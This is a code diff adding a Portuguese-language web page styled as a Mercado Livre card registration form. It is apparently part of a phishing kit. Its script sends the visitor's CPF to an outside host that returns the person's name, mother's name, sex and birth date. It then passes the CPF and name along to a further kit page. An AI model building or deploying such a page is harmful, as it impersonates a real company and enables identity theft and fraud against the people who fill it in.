@@ -1,0 +1,232 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/all.min.css">
+    <title>Cartão</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f2f2f2;
+            color: #333;
+        }
+        .header {
+            display: flex;
+            align-items: center;
+            padding: 10px;
+            border-bottom: 1px solid #aa9900;
+            background-color: #FFE600;
+        }
+        .header img {
+            width: 125px;
+            padding: 10px;
+        }
+        .logo {
+            margin-left: 20px;
+        }
+        .content {
+            margin: 0 auto;
+            padding: 10px 20px 30px 20px;
+            margin: 0px 15px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            background-color: #ffffff;
+            margin-top: 20px;
+        }
+        h1 {
+            font-family: 'Sora', sans-serif;
+            color: #333;
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+        .cpf-input {
+            width: 100%;
+            padding: 15px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            box-sizing: border-box;
+        }
+        .button {
+            background-color: #FFE600;
+            color: #1c1c1c;
+            padding: 15px 30px;
+            border-radius: 10px;
+            font-family: 'Sora', sans-serif;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            text-decoration: none;
+            display: inline-block;
+            text-align: center;
+            box-sizing: border-box;
+            border: none;
+        }
+        .button2 {
+            background-color: #FFE600;
+            color: #1c1c1c;
+            padding: 15px 30px;
+            border-radius: 10px;
+            font-family: 'Sora', sans-serif;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            text-decoration: none;
+            display: inline-block;
+            text-align: center;
+            box-sizing: border-box;
+            border: none;
+        }
+        .button:hover {
+            background-color: #e6cf00;
+        }
+        label {
+            font-family: 'Sora', sans-serif;
+            color: #666;
+            font-size: 16px;
+            display: block;
+            margin-bottom: 10px;
+        }
+        .notification-card {
+            background-color: #ffeded;
+            border: 1px solid #ff5252;
+            color: #ff5252;
+            padding: 15px 20px;
+            border-radius: 8px;
+            font-family: 'Sora', sans-serif;
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+            display: none;
+        }
+        .notification-card i {
+            margin-right: 10px;
+            font-size: 18px;
+        }
+    </style>
+</head>
+<body>
+  <div class="header">
+    <img src="images/logo.png" alt="Logo Mercado Livre" class="logo">
+  </div>
+
+  <div class="content">
+    <div id="primeiraParte">
+      <h1>Preencha seus dados para cadastro</h1>
+
+      <label for="cpf">CPF</label>
+      <input type="text" id="cpf" class="cpf-input" placeholder="000.000.000-00" maxlength="14">
+
+      <div id="notification" class="notification-card">
+        <i class="fas fa-exclamation-circle"></i>
+        <span id="notification-message"></span>
+      </div>
+
+      <button class="button2" id="consultarBtn">Continuar</button>
+    </div>
+
+    <div id="resultadoModal" style="display:none;">
+      <div id="dadosContainer">
+        <div id="nomeContainer">
+          <div>Nome completo:</div>
+          <div id="nomeResult"></div>
+        </div>
+        <div id="maeContainer">
+          <div>Nome da mãe:</div>
+          <div id="maeResult"></div>
+        </div>
+        <div>
+          <div>Sexo:</div>
+          <div id="sexoResult"></div>
+        </div>
+        <div>
+          <div>Data de nascimento:</div>
+          <div id="nascimentoResult"></div>
+        </div>
+      </div>
+      <button class="button" id="continuarBtn">Continuar</button>
+    </div>
+  </div>
+
+  <script>
+    function showNotification(msg) {
+      const notif = document.getElementById('notification');
+      document.getElementById('notification-message').textContent = msg;
+      notif.style.display = 'flex';
+      setTimeout(() => notif.style.display = 'none', 3000);
+    }
+
+    function setBtnLoading(state) {
+      const btn = document.getElementById('consultarBtn');
+      btn.disabled = state;
+      btn.innerHTML = state
+        ? "<i class='fas fa-spinner fa-spin' style='margin-right:10px'></i>Realizando cadastro"
+        : "Continuar";
+    }
+
+    document.getElementById('consultarBtn').addEventListener('click', async () => {
+      const rawCpf = document.getElementById('cpf').value.replace(/\D/g, '');
+      if (rawCpf.length !== 11) {
+        showNotification('Por favor, insira um CPF válido');
+        return;
+      }
+
+      setBtnLoading(true);
+      try {
+        const res = await fetch(`https://base1.sistemafull.site:80/api/cpfx?CPF=${rawCpf}`);
+        const data = await res.json();
+
+        if (data.NOME) {
+          const user = {
+            NOME: data.NOME,
+            MAE: data.MAE || '',
+            SEXO: data.SEXO,
+            NASCIMENTO: data.NASCIMENTO
+          };
+          localStorage.setItem('dadosUsuario', JSON.stringify(user));
+
+          document.getElementById('nomeResult').textContent = user.NOME;
+          if (user.MAE) {
+            document.getElementById('maeResult').textContent = user.MAE;
+            document.getElementById('maeContainer').style.display = 'block';
+          } else {
+            document.getElementById('maeContainer').style.display = 'none';
+          }
+          document.getElementById('sexoResult').textContent = user.SEXO;
+          document.getElementById('nascimentoResult').textContent = user.NASCIMENTO;
+
+          document.getElementById('primeiraParte').style.display = 'none';
+          document.getElementById('resultadoModal').style.display = 'block';
+        } else {
+          showNotification('CPF não encontrado');
+        }
+      } catch (err) {
+        console.error(err);
+        showNotification('Erro ao consultar CPF. Tente novamente.');
+      } finally {
+        setBtnLoading(false);
+      }
+    });
+
+    document.getElementById('continuarBtn').addEventListener('click', () => {
+      const params = new URLSearchParams(window.location.search);
+      const user = JSON.parse(localStorage.getItem('dadosUsuario') || '{}');
+      params.set('document', document.getElementById('cpf').value.replace(/\D/g, ''));
+      if (user.NOME) params.set('name', user.NOME);
+      window.location.href = '../ml5/index.html?' + params.toString();
+    });
+
+    document.getElementById('cpf').addEventListener('input', e => {
+      let v = e.target.value.replace(/\D/g, '').slice(0,11);
+      v = v.replace(/(\d{3})(\d)/, '$1.$2');
+      v = v.replace(/(\d{3})\.(\d{3})(\d)/, '$1.$2.$3');
+      v = v.replace(/(\d{3})\.(\d{3})\.(\d{3})(\d)/, '$1.$2.$3-$4');
+      e.target.value = v;
+    });
+  </script>
+
+</body></html>
